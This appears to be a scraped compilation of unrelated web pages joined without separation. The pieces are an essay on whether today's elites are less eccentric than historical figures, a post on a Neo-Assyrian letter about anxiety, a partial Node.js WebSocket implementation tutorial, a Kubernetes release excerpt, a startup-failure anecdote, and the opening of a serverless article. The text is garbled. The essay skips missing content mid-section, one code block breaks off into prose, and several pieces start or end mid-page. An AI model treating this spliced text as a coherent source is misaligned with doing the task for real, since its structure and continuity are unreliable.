<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>I</h3><p>Are we less eccentric than we used to be?</p><p>The thought started from a <a href="https://twitter.com/SamoBurja/status/1356195647729389570">Twitter exchange</a> recently. The prior credence that seemed to exist was that somehow we're living in an age of mediocrity. An era where the Great Persons of history or Great Works of history didn't exist any longer, or at least only existed sporadically.</p><blockquote><p>If you take a random sample of the important movers and shakers of 18th and 19th century Britain and compare them to 21st century America the biographies of the former are far more interesting, their pet projects far bolder and more creative.</p></blockquote><p>There's also the persistent myth that this is why we're just not accomplishing much.</p><blockquote><p>People like Musk are the exception today, in the age of Rockefeller they were the rule...</p></blockquote><p>But can it be true? What we know of Rockefeller comes from a historical lens that's more than a century removed. What we know of Bill Gates and Jeff Bezos and Elon Musk comes from minute-by-minute updates published with no filter.</p><p>The older generation had Howard Hughes, but we have Elon Musk. Yes Hughes went nutty and used to store his pee in bottles, but Musk sincerely believes we can become AI-human hybrids who live on Mars. So that’s a tie. </p><p>There was an exploration by <a href="https://scholars-stage.blogspot.com/2021/01/where-have-all-great-works-gone.html">Scholars Stage</a> that looked at an adjacent phenomenon. At many a time in human history, you could pretty easily name those writers who are destined to become classics. The punchline made in the article (though you should go read the whole thing) is that we have homogenised our culture enough that we're stuck and stagnant.</p><blockquote><p>In a world in which American culture is so dominant yet so sterile it is difficult for genuinely fresh developments abroad to arise. For three decades we have had our universal empire and all the intellectual rigidity that comes with it.</p></blockquote><p>There seems to be a huge amount of both recency bias and salience bias present in these assertions. But it's a belief held widely enough that it's worth figuring out if it's fair.</p><h3>II</h3><p>Let's take a first glance, trusting in the all seeing Google to see if we can see anything useful.

But we also have our eccentrics here. There's Elon Musk who wants us to become spacefaring human-AI hybrids, Bezos who can basilisk-stare entire industries, Peter Thiel who's a well known genius + oceanic vampire, Jack who runs two companies equally absently from a Polynesian island, Bill Gates solving all of the world's problems, an anonymous Satoshi Nakamoto and more.</p><p>There's also the true counterparts of PT Barnum, like Elizabeth Holmes from Theranos and Trevor Milton from Nikola.</p><p>It's just not clear to me that we're living in a world of "elite sheep" where the lack of talent or drive is our main issue. I repeat from above, someone invented the future of money <em><strong>and we have no idea who that is still.</strong></em></p><p>The one change that's worth mentioning is that we have much fewer eccentric world leaders, for the simple reason that a) there's much lesser looting and pillaging and conquering which appeals to a particular type of young man, and b) there's much fewer really rich people born into wealth with no legal or societal guardrails, helping them become as crazy as possible.</p><p>But maybe we're unfairly looking only at recent history. Let's go back in time to the Victorian ages. Do we have the equivalent of Lord Byron? For exploring we have Sir Ranulph Fiennes. He doesn't get the same love I feel, but he definitely fits the explorer/ swashbuckler/ poet bill. And we have David Bowie, a poet and Romantic who <a href="https://theconversation.com/david-bowie-a-latter-day-romantic-was-a-modern-day-lord-byron-84319">became Ziggy Stardust</a>, an alien liberator.</p><p>We all fall somewhere on a bell curve that determines our abilities. Yet our exploits often follow a power law. It holds true for wealth, for accomplishment, for scientific discoveries and genius. And in the days when the status-bar for who all you knew was barbell-shaped, where you knew your locals and also knew the King, very few people broke out.</p><p>Feels weird to think somehow we're immune to those pressures and have become fully conformist in a weirdly unspecifiable way. That can't be true, can it?</p><h3>III</h3><p>Channelling <a href="https://twitter.com/AdamasNemesis/status/1356268127378698240">Twitter</a> again:</p><blockquote><p>Which I'd argue is a key reason why so much was accomplished in the age of Rockefeller. An elite of "excellent sheep" might be able to make incremental improvements, but won't be able or willing to introduce genuine novelty. As it turns out that's more or less what we have...</p></blockquote><p>Of course in conflating eccentricities with elite success, this is one possible answer for Nicolas Bloom's idea of why ideas are getting harder to find. I can't reconcile it with the fact people are claiming this is true despite a) the better tech we have, b) the better IQs we have, and c) the increased population we have. So if we're smarter, more capable and there's just more of us, surely we can't have become <em>less</em> interesting or able to generate novel insights. Solving all those needs a systemic answer, not a talent based one.</p><p>But what if we took a slightly different tack and start looking at a few examples, randomly chosen, to see what the average idea of an eccentric is.</p><ul><li><p>Sir Tatton Sykes: A perfect British aristocrat, living in the late 19th century, who hated flowers with a consuming passion. He'd smash them when he saw one, and he also forbid his tenants in Yorkshire from growing the "nasty untidy things". In case that wasn't sufficient, as a replacement, he suggested cauliflowers. He also apparently used to buy coats in multiple sizes, to wear one atop another, so that he could take it off when he got hot or put them on when he got cold. To be honest, this sounds like genius to me!</p></li><li><p>Sir Ranulph Fiennes: A British explorer in the 20th century. He conducted expeditions to the South Pole, the North Pole and crossed Antarctica on foot. He circumnavigated around the world along its polar axis, and climbed the highest mountain on all seven continents. He climbed Mt Everest at age 65. He's also a pretty amazing author (you have to read The Feather Men), and a pretty good poet.</p></li><li><p>Lord Byron: He travelled the world and fought in the Greek War of Independence. He was bisexual, which he managed to hide reasonably badly. He was a politician, advocate of social reform and against the death penalty, which took some standing in those days. He was a philosopher and a fantastic poet. He also fathered Ada Lovelace, a foundational figure in the field of computer programming.</p></li><li><p>Alexander Thynn, Marquess of Bath: Among other amazing features, he lives in a safari park, decorated the rooms of his home with Kama Sutra paintings himself, and had 75 "wifelets" living in cottages on his estate. Need we say more?</p></li><li><p>Simon Norton: Mathematician in Cambridge, who at one point was called the greatest English mathematician since Newton. He worked with John Conway creating several discoveries related to finite groups and related to <a href="https://en.wikipedia.org/wiki/Conway%27s_Game_of_Life">Conway's Game of Life</a>. He was also obsessed with buses, spending most of his time later taking rides on buses all over England, fulfilling the public notion of what all mathematicians eventually become.</p></li><li><p>Other random selections: David Bowie, Walt Disney, Jane Goodall, Arthur Conan Doyle, Mark Twain</p></li></ul><p>Politics and business are a little too easy, so I bucketed them together lest they overwhelm the results.</p><ul><li><p>Business: Rockefeller, Elon Musk, Howard Hughes, Jack Dorsey, Warren Buffet, Richard Branson, JP Morgan, Rothschild, Henry Ford</p></li><li><p>Politics: Kim Jong Un, Fidel Castro, Donald Trump, Nicolas Maduro, there's no shortage of weirdos in politics today. It does seem to be the case though that only dictators seem authorised to act crazy, which is also why the olden days seemed odder like King George IV or King Ludwig II of Bavaria.</p></li><li><p>Entertainment: This is where our era truly shines. We have Bjork and Johnny Depp and Tim Burton and, come on, Nicolas Cage. We even have Michael Jackson, Andy Warhol and a long enough array of rockers that most of their antics have passed from insane to barely noteworthy.</p></li></ul><p>We forget sometimes that when we see the most interesting or eccentric people in history oftentimes we're seeing a selection from a long time period, selected out through a long period.</p><p>While making the list and doing a bit of random selection there seemed to be two forces at work, biasing the analysis. One was that there's of course recency bias in most available sources - there's just more written about modern day notable people. And another, those notable gentlemen (they were mostly gentlemen) from the 18th and 19th centuries were spread over a remarkably large time period (well toughly two and half centuries by definition), making it an unfair comparison. Since both the biases pointed in opposite directions, I took their effect as a wash, though this is a caveat emptor sort of situation.</p><h3>IV</h3><p>There's a coda to this. What defines our civilisation in many ways is our conception of the Great Work. Shakespeare's sonnets. Newton's diaries and discovery of gravity. Einstein's e = mc2 equation that captures the cosmos in something so simple. Mozart's Magic Flute. Whether it's in science, literature or music, the Great Work is a constant.</p><p>Do we have anything comparable in the past half century?</p><p>Oswald Spengler, in his <a href="https://www.amazon.com/gp/product/B08H8WX8S7/ref=dbs_a_def_rwt_bibl_vppi_i0">analysis of comparative world history</a> espouses the theory that all great cultures, us included, follow a similar arc. If you feel like it echoes Peter Turchin's theories of …</p></div></div>

		<p><span><strong>*GUEST POST by Moudhy Al-Rashid (see her bio <span><a href="https://papyrus-stories.com/guest-writers/">here</a></span>)</strong></span></p>

<p><span>The Neo-Assyrian physician Nabû-tabni-uṣurseems once upon a time for reasons we may never know to have fallen out of favour with the court. Unlike his colleagues, he no longer received compensation for his work. Payments promised by the court never materialised. Concern for his financial well-being and his position in the court snowballed into fear. Gripped by anxiety, he penned – or, rather, impressed – this letter to the king.</span></p>
<blockquote>
<p><span>“To the king, my lord, your servant Nabû-tabni-uṣur. Good health to the king, my lord!</span></p>
<p><span>…</span></p>
<p><span>If the king, my lord, knows a fault made by me, let the king not keep my alive!</span></p>
<p><span>…</span></p>
<p><span>All my associates are happy, (and) I am dying of a broken heart. I have been treated as if I did not keep the watch of the king, my lord; my heart has become exceedingly troubled, heartbreak has seized me, I have become exceedingly afraid: may the king revive my heart before my colleagues!”&nbsp;</span><span>(ABL 525)</span></p>
</blockquote>
<p><span>Found at Nineveh in the royal library and now housed in the British Museum (K. 590), the cuneiform tablet that carries these words provides a window onto a language for anxiety that overlaps with modern ways of framing worry, fear, and sorrow, a language that centres the heart, or Akkadian <em>libbu</em>,as an organ of thought and emotion. More specifically, a broken heart.</span></p>

<p><span>Our physician’s description organises his experience of heartbreak along the same lines as those found in contemporary therapeutic medical texts, a rich corpus of texts that describe illnesses and prescribe treatments, like this one from nearby Aššur:</span></p>
<blockquote>
<p><span>“[If] he continually has heartbreak… in his bed he is continually afraid, he suffers paralysis up his form; toward god and king, his heart is filled (with anger), his limbs are poured out repeatedly, on repeated occasions he is afraid; day and night he does not sleep, he continually sees frightening dreams, he continually suffers paralysis; he has no desire for bread or beer; he forgets the words that he speaks.”&nbsp;(BAM 234)</span></p>
</blockquote>
<p><span>Fear, paralysis, nightmares, sleeplessness, loss of appetite, and forgetfulness are recorded as presenting with the condition labelled as heartbreak.</span></p>
<p><span>For anyone who has experienced anxiety, some of these symptoms might sound familiar. In modern biomedical models, anxiety is also described both in mental and physical terms. Adjectives that describe emotional states, like worried, afraid, and nervous, appear alongside descriptions like physical weakness, gastrointestinal problems, and a pounding heart to describe experiences associated with anxiety.</span></p>
<p><span>Symptoms of any illness are labelled according to socially available categories, and it seems that for a Neo-Assyrian physician, the vocabulary for this particular experience of mental distress has echoes in today’s world. And it seems that in the first millennium BCE, it was acceptable to admit, even to a king, that one was suffering emotional anguish.</span></p>
<p><span>Some of the earliest known expressions of mental distress come from ancient Mesopotamia, where ancient scribes impressed into clay words that capture individual, collective, and historical experiences not just of anxiety, but of a whole spectrum of mental health issues, from depressed states to disorganised thoughts.</span></p>
<p><span>So, if you ever you find yourself feeling anxious, remember Nabû-tabni-uṣur and his letter to a Neo-Assyrian king, and remember that you are not alone. These are ancient and human problems. They connect us to the past, and they connect us to each other.</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
				<p>
	Today I implemented WebSocket support for 
	 <a href="https://github.com/tholian-network/stealth">Tholian Stealth</a> 
	.
</p>
<p>
	But, I soon came to realize that when implementing WebSockets from
	scratch that there is no go-to-and-know-everything resource
	available on the internet.
</p>
<p>
	Also, reading the RFC is kinda tedious, so I'm trying my best to
	have enough code demos available for clarifications. This guide
	tries to cover everything when it comes to the current WS13
	network protocol, including reserved frames and how to support
	them in future.
</p>
<p>
	Most people will most likely use socket.io, but from my personal
	view I wouldn't recommend it. In my use cases I use WebSockets
	peer-to-peer (yes, you can, despite everybody else claiming no),
	and the whole dependency tree of socket.io is rather redundant
	than performant.
</p>
<p>
	For the implementation we're going to build in this article,
	we only need plain node.js and its 
	 <code>net</code>
	 core stack. The
	implementation will be peer-to-peer, which means it can be used
	for both the client-side and server-side whereas both sides
	are implemented in node.js for the sake of simplicity.
</p>
<h2>Introduction</h2>
<p>
	First off, you have to know that the 
	 <code>WS13</code>
	 protocol is specified as
	 <a href="https://tools.ietf.org/html/rfc6455">RFC6455</a> 
	and that there were a couple of legacy versions of Web Browsers around
	for a while that implemented the websocket protocol in a buggy manner.
</p>
<p>
	This is not the case anymore and I will completely ignore your shitty
	Safari from the dark ages here (it's 2019, not 2011 after all).
</p>
<p>
	The Web-Socket Protocol is a web protocol that uses HTTP's 
	 <code>Upgrade</code>
	mechanism in order to upgrade a connection. That means the first request
	to the server is actually an HTTP request with the 
	 <code>Connection: Upgrade</code>
	and 
	 <code>Upgrade: websocket</code>
	 headers.
</p>
<p>
	If the server has a specialized service-oriented architecture that
	needs more than just websocket data frames in order to work, it is
	good to implement it as a so-called sub protocol.
</p>
<p>These subprotocols can be used in the Web Browser, too.</p>
<pre>// Browser Example
let socket = new WebSocket('ws://localhost:12345', [
	'me-want-cookies' // Sub-Protocol
]);

let data = JSON.stringify({ foo: 'bar' });
let blob = new Uint8Array(8);

socket.send(data); // Text Frame
socket.send(blob); // Binary Frame
</pre>
<h2>Web-Socket Server</h2>
<p>The demo will be implemented in modern node.js.</p>
<p>
	The server creation has to be done with the 
	 <code>net.Server()</code>
	 interface,
	as the data that we need to access is 
	 <code>raw TCP data</code>
	 and our library
	will have to support binary encodings.
</p>
<p>
	It is important that the TCP connection is modified to fit our needs
	in order to never timeout. The WS13 protocol uses a 
	 <code>Ping Frame</code>
	 and
	a 
	 <code>Pong Frame</code>
	 which we have to manage ourselves, so we need to tell
	the TCP networking stack that by setting 
	 <code>socket.allowHalfOpen</code>
	 to 
	 <code>true</code>
	and by calling 
	 <code>socket.setTimeout(0)</code>
	 and 
	 <code>socket.setKeepAlive(true, 0)</code>
	.
</p>
<p>
	As node.js runs 
	 <code>libuv</code>
	 in the background, which is of asynchronous
	nature, we also have to make sure that everything gets send as soon
	as possible by calling 
	 <code>socket.setNoDelay(true)</code>
	.
</p>
<pre>// server.mjs
import net    from 'net';
import { WS } from './WS.mjs';


// Chapter: Opening Handshake
const parse_opening_handshake = (buffer) =&gt; {

	let headers = {};
	return headers;

};

let server = new net.Server({
	allowHalfOpen:  true,
	pauseOnConnect: true
});

server.on('connection', (socket) =&gt; {

	socket.on('data', (buffer) =&gt; {

		let headers = parse_opening_handshake(buffer);
		if (
			headers['connection'] === 'Upgrade'
			&amp;&amp; headers['upgrade'] === 'websocket'
			&amp;&amp; headers['sec-websocket-protocol'] === 'me-want-cookies'
		) {

			WS.upgrade(socket, headers, (result) =&gt; {

				if (result === true) {

					console.log('WS.upgrade() successful.');

					socket.allowHalfOpen = true;
					socket.setTimeout(0);
					socket.setNoDelay(true);
					socket.setKeepAlive(true, 0);

					socket.removeAllListeners('timeout');
					socket.removeAllListeners('data');

					socket.on('data', buffer =&gt; {

						WS.receive(socket, buffer, request =&gt; {
							console.log('Received request ', request);
						});

					});

				} else {

					console.error('WS.upgrade() unsuccessful.');
					console.error('Sorry, no HTTP allowed either, yo');

					socket.end();

				}

			});

		} else {

			console.error('Sorry, no TCP allowed, yo');

			socket.end();

		}

	});

	socket.on('error',   () =&gt; {});
	socket.on('close',   () =&gt; {});
	socket.on('timeout', () =&gt; socket.close());

	socket.resume();

});

server.on('error', () =&gt; server.close());
server.on('close', () =&gt; (server = null));

server.listen(12345, null);
</pre>
<h2>Opening Handshake</h2>
<p>
	The initial request that is done via HTTP is conform to 
	 <code>HTTP/1.1</code>
	,
	so it is very easy to parse and the payload is encoded in 
	 <code>utf8</code>
	and not 
	 <code>binary</code>
	, which eases up the parsing process.
</p>
<p>
	The headers are - as every network byte ordered data - separated
	by 
	 <code>\r\n</code>
	 after each line, which means it's best to simply parse
	line-by-line and just trim everything off to have margin for
	malformed but recoverable handshakes.
</p>
<pre>GET / HTTP/1.1
Host: example.cookie.engineer
Upgrade: websocket
Connection: Upgrade
Origin: http://localhost:12345
Sec-WebSocket-Key: bm9tbm9tCg==
Sec-WebSocket-Protocol: me-want-cookies
Sec-WebSocket-Version: 13
</pre>
<p>
	The header parsing mechanism for 
	 <code>HTTP/1.1</code>
	 is quite easy,
	as it's just utf8 encoded data that has a trailing 
	 <code>\r\n\r\n</code>
	following its headers section.
</p>
<p>
	Fragmented frames always have this, but you never know what
	kind of script kiddie is challenging your server - so it's
	good to have a failsafe parsing mechanism in place.
</p>
<pre>// server.mjs

const parse_opening_handshake = (buffer) =&gt; {

	let headers = {};

	let req = buffer.toString('utf8');
	let raw = req.split('\n').map((line) =&gt; line.trim());

	if (raw[0].includes('HTTP/1.1')) {

		raw.slice(1).filter((line) =&gt; line.trim() !== '').forEach((line) =&gt; {

			let key = line.split(':')[0].trim().toLowerCase();
			let val = line.split(':').slice(1).join(':').trim();

			headers[key] = val;

		});

	}

	return headers;

};
</pre>
<h2>Connection Upgrade</h2>
<p>
	After the initial Opening Handshake request, it's expected to send
	the handshake verification back to the client.
</p>
<p>
	The handshake response contains the 
	 <code>Sec-WebSocket-Accept</code>
	 header
	and the 
	 <code>Upgrade: WebSocket</code>
	 and 
	 <code>Connection: Upgrade</code>
	 as well.
</p>
<p>
	Additionally, it is good to let the client know which protocol
	we are expecting (so that mismatches can be handled automatically)
	by sending the 
	 <code>Sec-WebSocket-Protocol: me-want-cookies</code>
	 and
	the 
	 <code>Sec-WebSocket-Version: 13</code>
	 headers.
</p>
<p>
	Note that the 
	 <code>nonce</code>
	 salt for the reply is static and is the
	utf8 value 
	 <code>258EAFA5-E914-47DA-95CA-C5AB0DC85B11</code>
	.
</p>
<pre>// WS.mjs
import { Buffer } from 'buffer';
import crypto     from 'crypto';



const WS = {};


WS.upgrade = (socket, headers, callback) =&gt; {

	headers  = headers instanceof Object    ? headers  : null;
	callback = callback instanceof Function ? callback : null;

	if (headers !== null) {

		let nonce = headers['sec-websocket-key'] || null;
		if (nonce !== null) {

			let hash   = crypto.createHash('sha1').update(nonce + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11').digest('hex');
			let accept = Buffer.from(hash, 'hex').toString('base64');
			let blob   = [];

			blob.push('HTTP/1.1 101 WebSocket Protocol Handshake');
			blob.push('Upgrade: WebSocket');
			blob.push('Connection: Upgrade');
			blob.push('Sec-WebSocket-Accept: ' + accept);
			blob.push('Sec-WebSocket-Protocol: me-want-cookies');
			blob.push('Sec-WebSocket-Version: 13');
			blob.push('');
			blob.push('');

			// XXX: Flags are used later
			socket._is_server = true;
			socket._is_client = false;

			socket.write(blob.join('\r\n'));

			if (callback !== null) {
				callback(true);
			}

			return true;

		}

	} else {

		if (callback !== null) {
			callback(false);
		}

		return false;

	}

};


// Chapter: Receiving Web-Socket Frames
WS.receive = (socket, buffer, callback) =&gt; {};

// Chapter: Peer-To-Peer Web-Sockets
WS.ping = (socket) =&gt; {};

// Chapter: Sending Web-Socket Frames
WS.send = (socket, payload) =&gt; {};

	Web-Socket Frames can be a bit complicated when just looking at
	the figure. Here's a bullet-point list of what to remember
	:
</p>
<ul>
	<li>Frames can be fragmented (because of TCP), so the first bit is the <code>fin</code> flag.</li>
	<li>The <code>rsv1</code> , <code>rsv2</code> and <code>rsv3</code> are Web-Socket Extension flags. If set to <code>1</code> , the payload can be processed differently.</li>
	<li>The <code>opcode</code> decides what kind of Web-Socket frame follows.</li>
	<li>The <code>client-to-server</code> transferred <code>mask flag</code> decides whether or not the payload needs to be XOR-masked.</li>
	<li>The <code>masking key</code> is <code>32 bits</code> long (4 bytes). It is only transferred when <code>mask flag</code> is set to <code>1</code> .</li>
	<li>The <code>server-to-client</code> transferred <code>mask flag</code> is always set to <code>0</code> and the data frame does not contain a masking key.</li>
	<li>Frames have a variable payload size. Payload length can …</li></ul></article></div>

					<p>Since release 0.9.0, a single service cluster can now monitor and audit multiple workload clusters. This allows organization to have one workload cluster per team, application or department — whatever suits their information security policies — but without incurring an increase in monitoring overhead.

					<p>To simplify compliance with access control policies, Compliant Kubernetes now includes support for propagating group claims from OpenID providers — such as Okta and Google — to Grafana, Harbor and the Kubernetes API. This allows your organization’s central roles to be mapped to various permissions. For example, when onboarding a new hire, you may add them to the “on-call operator” group in Okta, which will immediately give them access to various Grafana dashboards and <code>kubectl exec</code> permissions.</p>

<p>Have you ever seen the owner of a kebab joint slap a <strong>massive, buzzing wasp </strong>with his <strong>bare hand</strong> directly into the grill whilst you pitch your new startup to him? If this also happens to you, <em>your business idea is not good</em>.</p>
<p>Many gurus online will tell you how to achieve success. I’m the opposite. Today I will instruct you on the noble art of achieving <strong>failure when creating a new software startup</strong>.</p>
<p>That’s right. Want to know a <strong>secret </strong>(it’s all about secrets today)? If you want to ensure your new startup fails, then please <strong>keep your idea secret so that nobody steals it</strong>. We learned this lesson the painful way.</p>
<p>But wait, who am I? I’m a guy that started creating software companies back in 2014 and failed a few times until I eventually succeeded. You can check my <a href="https://diego-os.com/about-me/" data-type="page" data-id="11">About Page</a> to learn more about me.</p>
<p>This post is part of a series where I share <strong>common pitfalls on starting a company</strong> – <em>and how to avoid them</em>. I’ve fallen for these traps before so that you don’t have to.</p>
<p>Also, I promise <strong>the wasp story is real</strong> and related to the topic. You will soon see…</p>
<h2>Coding in “stealth mode”</h2>
<p>Let me tell you a story. The year was 2015, and I had a great cushy job right after graduation. I no longer had to eat <em>unbranded pasta</em> and <em>questionable ham sandwiches</em> every day, I was living the dream!</p>
<p>But then, I caught the sneaky <strong>startup bug</strong>. I thought, why work for someone else when I can <strong>follow my dreams</strong> and <strong>start a startup?</strong></p>
<p>I somehow happened to read somewhere that JustEat – the takeaway delivery company – was making <strong>a lot of money</strong>. Why not start something like that, but somehow “better”?</p>
<p>So, I read a couple of business books, I partnered up with someone, and we started coding in our spare time. In no time we had a prototype for our killer app… a JustEat clone… <em><strong>but with pictures of the food!</strong></em> Revolutionary!</p>
<p>Curious to learn what happened next? Did this epic tale of the underdogs following their dreams end up in massive success? Will the bards of the future sing about our heroic deeds? is wasp kebab any good?</p>
<p><strong>Spoiler alert</strong>: Our fear of Bill Gates dropping from a helicopter into our “office” (a smelly bedroom) to snatch our “archives” (a battered notebook I bought in Poland for £0.20) didn’t materialize. Something else happened.</p>
<h2>But “I don’t want anyone to steal my ideas”</h2>
<p>So, we came up with a random idea for a food-related app, and called it <strong>Foodswiper </strong>– it was like Tinder, <em>but for food</em>. Then, we started coding for months <strong>in secret</strong>, without telling anyone.</p>
<p>Of course, our idea was so valuable, so <em>irresistible</em>, that mentioning it would trigger all our friends to immediately ditch their jobs and families, and start coding to <strong>steal our idea</strong>. Even our moms were suspected of such intrigues.</p>
<p>I remember my flatmate throwing away post from the government directed at our company. He thought the address was wrong – I rescued the letter from the rubbish at night (of course in secret) and felt like <strong>James Bond</strong>.</p>
<p>So, why is all of this wrong?</p>
<p>Well, first of all, <strong>nobody is going to steal your ideas</strong>. The only ideas worth protecting are highly specialized academic research, military secrets, copyrightable material, etc. The obvious stuff that needs to be secret.</p>
<p>Secondly, keeping your idea secret prevents you from getting <strong>crucial feedback</strong> <strong>from customers</strong>, and getting customer feedback should be your goal when starting a new software product company.</p>
<p>In our case, with Foodswiper, we spent months coding the application up and when we finally came out to the real world to get some customers… we discovered that <strong>nobody wanted our app</strong>.</p>
<p>A lot of pain and resources could have been saved if we tried to get our idea out there earlier instead of coding it up in secret for months.</p>
<h2>Why do people fall for this trap?</h2>
<p>I literally think the real reason people keep their ideas secret is <strong>fear of failure</strong>. Ironically, this fear of failure leads to failure itself!</p>
<p>People that want to start startups are often – but not always – accomplished individuals that have succeeded at many things in the past. <strong>When you have a good track record, you don’t want to sully it with failure.</strong></p>
<p>For example, in my case, I kind of had a very good trajectory. I graduated top of my class from Cambridge University, got a great job at Citi, and was succeeding at everything I cared about in life.</p>
<p>If you asked me back then why I kept my startup idea secret, I probably would have said <em>“so that nobody steals it”</em>, but the real reason was probably closer to fear of failure coupled with inexperience.</p>
<p>A startup is a big gamble. So many things can go wrong. It can be really painful to be “winning at life” for many years and then lose it all. <strong>All your fancy titles mean nothing</strong> when you start a startup. It’s all about results.</p>
<p>Some people invest all their money and get financially ruined after all, and plenty of really accomplished people have tried the startup game and failed. We all know some stories like these of have heard of them.</p>
<h2>The solution: limiting the downside</h2>
<p>At least I can proudly say we had <strong>some </strong>foresight back in the day. We acknowledged that we didn’t know many things so we engineered a situation where it wouldn’t be the end of the world if we failed.</p>
<p>Basically, we saved up all we could working in London. Then, we moved to a cheap country where our savings would last us around 2 years. This gave us <strong>plenty of time to learn</strong> (and eventually succeed with a different idea).</p>
<p>The backup plan was to come back to working as software developers for another company, and we were young and had no dependents, so the risk of total failure was mostly mitigated.</p>
<p>When you remove the risk of catastrophic ruin should your idea not work out, then you limit the fear and increase your chances of success.</p>
<h2>Gather customer feedback early</h2>
<p>I promised I would talk about the wasp. So picking up where I left off, we coded furiously for months, and then, we took to the streets of London to try to convince restaurant owners one by one to sign up for our app.</p>
<p>Did I mention this was <strong>after</strong> I quit my job to pursue that startup idea full time? i.e. <strong>dropping my income to zero</strong>. This was a depressing time. Nobody from any restaurant was interested at all.</p>
<p>Imagine a twenty-something year old, <em>inexplicably dressed in a suit,</em> entering your takeaway establishment and asking if you want to sign up for an app with <strong>no users</strong> that they have <strong>never heard of</strong>.</p>
<p>We basically visited hundreds of restaurants and nobody, <strong>zero people</strong>, were interested… until we got a signal from the heavens.</p>
<p>After an exhaustive search we finally found <em>one guy</em> that wanted to sign up for our app. To be fair, this man was really enthusiastic and wanted to help, I really appreciate people like this, but it was not meant to be.</p>
<p>Unfortunately this just wouldn’t work. This is when the guy slapped the wasp into the grill. Needless to say you don’t want to see a dead wasp in your food. Also, too bad we needed millions of other people to also sign up.</p>
<p>There were so many insurmountable problems. If only the guy slapped me in the face that day, maybe that way I would have learned quicker.</p>
<p>We should have stopped the project then with the wasp incident, but we still stubbornly continued for 6 more months. For some reason we thought that restaurants were not interested because <strong>we lacked features!</strong> </p>
<p>It makes me cringe to think about those extra 6 months now. What we were lacking was <strong>customers</strong>, not <strong>features</strong>. We had <em>freaking </em>business cards! But not a single user.</p>
<p>We somehow convinced ourselves to continue writing code and features with no users! It’s insanity! We even <strong>made up</strong> some graphs with “projections” and automated billing systems for zero cash-flow. Ridiculous.</p>
<h2>Succeed with your idea instead of keeping it secret</h2>
<p>Instead of keeping your idea secret you should test it as soon as possible. Don’t fall for the same trap we did.</p>
<p>In our case, we eventually learned this lesson and stopped <em>Foodswiper</em>. We then tested 5 business ideas in just one month <strong>before</strong> coding them up. Out of those 5, one of them was <a href="https://nutriadmin.com/">https://nutriadmin.com</a>, which was successful.</p>
<p>We tested the ideas <strong>very quickly</strong> by creating a single one page mockup for each, and then placing ads, sending cold emails, and contacting prospects to ask if they would buy the product we were planning to build.</p>
<p>This allowed us to quickly discard 4 out of our 5 ideas (we didn’t find any interest for them for different reasons).</p>
<p>Moreover, when we found the app idea for nutritionists, the people we talked to gave us <strong>a list of the features they would need</strong>, and other key details that helped us succeed! Clearly this is a much better approach!</p>
<p>When we eventually launched our first (terrible) version of the software, we already had a couple of people in our list to try to sell it to. Even though we lacked features, some people paid for it and said they found it <strong>useful</strong>!</p>
<p>Over the years we have extended and grown this app to a much more professional product. But it all started with an idea and customer feedback. <strong>Crucially</strong>, it didn’t start with months of coding in secret.</p>
<p>I didn’t invent this “technique”, it’s broadly called <strong>customer development</strong>, and was popularized by Steve Blank in his book <em>The 4 steps to the epiphany</em> and later by his student Eric Ries in <em>The Lean Startup</em>. It works, confirmed.</p>

If you want to learn more about how serverless technologies is changing the application landscape, be sure to check out the next blog post in the Serverless Series: <a target="_blank" rel="noopener" href="https://koyeb.com/blog/going-serverless-implications-benefits-and-challenges"><strong>Going Serverless: Implications, Benefits and Challenges</strong></a>.</p><h2 id="overview">Overview<span><a tabindex="0" aria-disabled="false" href="#overview"><span></span></a></span></h2><p>In short, serverless computing means the fact of installing, maintaining, scaling, or upgrading servers is completely abstracted for the user.</p><p>Serverless is a significant evolution in cloud computing because users no longer have to manage the underlying infrastructure in order to scale their functions, containers, databases, and more; cloud service providers take care of this for them automatically and cost-effectively.</p><p>Above all, going serverless is a strategic decision with considerable benefits in the short and long term. Serverless is becoming the new standard to host modern and greenfield applications.</p><h2 id="quick-refresher-on-the-history-of-cloud-computing">Quick Refresher on the History of Cloud Computing<span><a tabindex="0" aria-disabled="false" href="#quick-refresher-on-the-history-of-cloud-computing"><span></span></a></span></h2><h3 id="pre-cc-cloud-computing">Pre-CC (Cloud Computing)<span><a tabindex="0" aria-disabled="false" href="#pre-cc-cloud-computing"><span></span></a></span></h3><p>At the dawn of the computing era, those who wanted to leverage computing technology needed to buy, install, maintain, and upgrade their own physical servers - a very expensive and time-consuming endeavor.</p><p>Even with their high-cost, computing technologies increased efficiency by orders of magnitude, so firms began to transition to the digital era. Still, building a computing infrastructure required massive amounts of upfront investment in the form of time, manpower, and money. Best practices included investing in large computing infrastructures that your firm would grow into and owning enough servers to handle the occasional spikes in activity. This capacity over-provisioning was really inefficient with expensive servers idling most of the time.</p><h3 id="cloud-computing-emergence">Cloud Computing Emergence<span><a tabindex="0" aria-disabled="false" href="#cloud-computing-emergence"><span></span></a></span></h3><p>Since the introduction of cloud computing in the mid-2000s, individuals and firms alike can outsource their computing infrastructures to cloud service providers (CSPs). CSPs provide and manage different levels of cloud computing services: Infrastructure as a Service (IaaS), Platform as a Service (PaaS), and Software as a Service (SaaS).</p><p><img src="https://www.koyeb.com/static/images/blog/aaS-graphic.png" alt="Managed Services"></p><p>IaaS, PaaS and SaaS are often represented as a pyramid as each of them provides a higher level of abstraction.</p><p>This outsourcing is a radical evolution in computing practices. Small and large companies alike can save incredible amounts of money, manpower, and time all while tailoring their computing infrastructures exactly to their needs and refocusing those resources back into their businesses.</p><h2 id="the-rise-of-serverless">The Rise of Serverless<span><a tabindex="0" aria-disabled="false" href="#the-rise-of-serverless"><span></span></a></span></h2><h3 id="serverless-is-a-broad-and-global-term">Serverless is a Broad and Global Term<span><a tabindex="0" aria-disabled="false" href="#serverless-is-a-broad-and-global-term"><span></span></a></span></h3><p>Serverless computing is an evolution of cloud computing. In short, serverless computing means the duty of installing, maintaining, scaling, or upgrading servers is completely removed for the user. </p><p>In fact, the word serverless only makes sense from the user's perspective because the user no longer has to worry about managing the underlying infrastructure. Servers are still very much in the picture as servers perform the computing operations, but there is a responsibility shift: they are now maintained and provisioned by the cloud service provider.</p><p>The term serverless started to be actively used in the industry for mainstream computing and web applications in 2015, after the launch of AWS Lambda, a serverless Function-as-a-Service (FaaS) platform. Although FaaS is often associated with the serverless term, these two concepts should not be conflated. During the following years, a lot of other serverless services emerged, and the promise to reduce infrastructure complexity quickly enticed developers and companies.</p><h3 id="everything-serverless">Everything Serverless<span><a tabindex="0" 